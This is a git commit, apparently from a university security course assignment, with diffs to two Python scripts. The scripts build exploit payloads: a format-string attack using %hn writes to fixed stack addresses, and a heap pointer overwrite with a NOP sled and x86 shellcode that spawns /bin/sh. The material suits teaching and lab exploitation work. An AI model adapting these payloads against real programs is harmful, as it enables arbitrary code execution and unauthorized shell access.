9e60f575055c0a8b33f42eae808ea617dd3d2127
Sujay Patwardhan <sujay.patwardhan@gmail.com>
2018-02-14 00:03:03 -0600

    mp1 done

--- mp1/1.2.11.py
+++ mp1/1.2.11.py
@@ -1,18 +1,14 @@
 from struct import pack
-#from shellcode import shellcode
+from shellcode import shellcode
 
-shellcode = "\x69" * 23
+#shellcode = "\x69" * 23
 padding = "\x90" * 1
 takeoff = pack("<I", 0xbffeb09c) # Address of esp
 offset  = pack("<I", 0xbffeb09e)  # Address of esp
 
-#print "\xb4\xb0\xfe\xbf" + shellcode + padding + takeoff + offset + "%49113c.%4$hn%45231c.%5$hn"
-print shellcode + padding + takeoff + offset + "%49117c.%4$hn%0c.%5$hn"
-#print shellcode + padding + takeoff + offset + "%105c.%4$hn%105c.%5$hn"
-# in this case, beginning of buf (aka shellcode) is at 0xbffeb0b0
-print "\x9c\xb0\xfe\xbf%10$n"
-# total is 23 + 1 + 4 + 4 = 32. so, to write bffe we add 49150 - 32 - 1 (for the period) bytes.
-# then, to write b0b0 we add 45232 - 1 (for the period) bytes.
+#print shellcode + padding + takeoff + offset + "%45200x%04$hn%03910x%05$hn"
+print takeoff + offset + "%45260x%04$hn%03882x%05$hn" + "\x90\x90" + shellcode
+# in this case, beginning of shellcode is at 0xbffeb0d4
 
 # the idea is to write the first int as hex to the top half of the word and second int to the bottom
 # such that the final built address points to the location of shellcode. this word is located at $esp
--- mp1/1.2.8.py
+++ mp1/1.2.8.py
@@ -1,13 +1,12 @@
-from shellcode import shellcode
 from struct import pack
 
-JMP   = "\x6a\x0b\xeb\x06"
-NOP   = "\x90\x90\x90\x90\x90\x90\x90\x90"
-SHELL = "\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
+takeoff = "\x6a\x0b\xeb\x06"
+offset  = "\x90" * 8
+shellcode   = "\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
 
 
 prev_a_addr = pack("<I", 0x080f3780)
-prev_b_addr = pack("<I", 0xbffeb8a8 + 4)
+prev_b_addr = pack("<I", 0xbffeb8ac)
 
-print "\xAA"*32 + " " + "\xAA"*40 + prev_a_addr + prev_b_addr + " " + JMP + NOP + SHELL
+print "\x69"*32 + " " + "\x69"*40 + prev_a_addr + prev_b_addr + " " + takeoff + offset + shellcode
 
